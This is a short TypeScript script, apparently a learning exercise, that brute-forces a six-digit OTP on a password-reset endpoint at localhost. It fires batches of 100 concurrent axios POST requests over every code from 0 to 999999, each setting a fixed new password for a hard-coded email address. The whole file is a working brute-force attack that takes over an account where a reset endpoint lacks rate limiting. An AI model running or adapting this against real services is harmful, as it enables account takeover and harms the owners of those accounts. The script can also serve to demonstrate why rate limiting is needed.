import axios from 'axios'


async function sendRequest(otp: string) {

    let data = JSON.stringify({
      "email": "jayahari273@gmail.com",
      "otp": otp,
      "newPassword": "2222222"
    });
    
    let config = {
      method: 'post',
      maxBodyLength: Infinity,
      url: 'http://localhost:3000/reset-password',
      headers: { 
        'Content-Type': 'application/json'
      },
      data : data
    };

    try{

        await axios.request(config)
    }catch(e){
        // console.log(e)
    }   
    
    // .then((response :any) => {
    //   console.log(JSON.stringify(response.data));
    // })
    
    
    // .catch((error: any) => {
    //   console.log(error);
    // });
}


//we can use this to send multiple requests, but this is not effficient
// for (let i = 0; i <= 999999; i++) {
//     sendRequest(i.toString())
// }

//the efficient way is to use do batch requests -> send 100 requests at a time

async function main(){

    for (let i = 0; i <= 999999; i+=100) {
        let p=[]
        console.log(i);
        
        for(let j = 0; j < 100; j++){
            p.push(sendRequest((i+j).toString()))
        }
    
        await Promise.all(p) //we wait for all the 100 requests to be completed before sending the next batch.
        
    }
}
main()

// sendRequest("818825")
